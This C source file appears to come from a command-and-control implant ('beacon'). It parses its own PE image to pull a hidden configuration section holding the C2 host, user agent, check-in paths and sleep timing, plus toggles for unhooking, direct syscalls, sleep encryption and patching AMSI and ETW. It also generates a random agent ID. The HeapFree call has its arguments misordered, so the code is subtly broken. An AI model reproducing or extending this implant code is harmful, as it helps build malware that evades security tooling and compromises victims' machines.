#include "pch.h"
#include "api.h"
#include "utils.h"
#include "beacon.h"

extern API g_Api;
extern PWCHAR g_lpwId;
extern HMODULE g_hModule;

BOOL UnpackProfile(
    PPROFILE g_Profile
)
{
    PBYTE pbBase = (PBYTE)g_hModule, pbPtr = pbBase;

    if (!pbPtr || *(WORD*)pbPtr != 'ZM')
    {
        return FALSE;
    }

    pbPtr = pbBase + *(DWORD*)(pbPtr + 0x3c);

    if (*(DWORD*)pbPtr != 'EP')
    {
        return FALSE;
    }

    WORD wSections = *(WORD*)(pbPtr + 0x06);
    WORD OptionalHeaderSize = *(WORD*)(pbPtr + 0x14);

    PIMAGE_SECTION_HEADER Section = NULL;
    PIMAGE_SECTION_HEADER Sections = (PIMAGE_SECTION_HEADER)(pbPtr + 0x18 + OptionalHeaderSize);

    for (INT i = 0; i < wSections; i++)
    {
        if (!memcmp( Sections->Name, SECTION_NAME, sizeof(SECTION_NAME) - 1 ))
        {
            Section = Sections;
            break;
        }

        Sections++;
    }

    if (!Section)
    {
        return FALSE;
    }

    PBYTE pbData = (PBYTE)pbBase + Section->VirtualAddress;
    DWORD dwData = Section->SizeOfRawData;

    if (!dwData)
    {
        return FALSE;
    }

    DWORD dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwHost = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwUserAgent = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwRegister = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    dwLen = *(DWORD*)pbData;
    pbData = pbData + 0x04;
    g_Profile->lpwPoll = (PWCHAR)pbData;
    pbData = pbData + dwLen;

    g_Profile->dwCallbackTimeout = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->dwSleepTime = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bUnHook = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bSyscalls = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bEncryptSleep = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bPatchAmsi = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bPatchEtw = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    g_Profile->bCleanSleep = *(DWORD*)pbData;
    pbData = pbData + 0x04;

    return TRUE;
}

BOOL GenerateId() {
    DWORD dwLen = 32;
    CHAR pCharset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    PCHAR lpTmp = HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        dwLen + 1
    );

    if (!lpTmp)
    {
        return FALSE;
    }

    srand(
        time( NULL )
    );

    for (DWORD dwIter = 0; dwIter < dwLen; dwIter++)
    {
        INT iKey = rand() % (int) (sizeof pCharset - 1);
        lpTmp[dwIter] = pCharset[iKey];
    }

    lpTmp[dwLen] = '\0';

    g_lpwId = HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        dwLen * 4
    );

    if (!g_lpwId)
    {
        return FALSE;
    }

    SIZE_T stRet = mbstowcs(
        g_lpwId,
        lpTmp,
        dwLen
    );

    if (stRet == -1)
    {
        return FALSE;
    }

    HeapFree(
        GetProcessHeap(),
        lpTmp,
        NULL
    );

    return TRUE;
}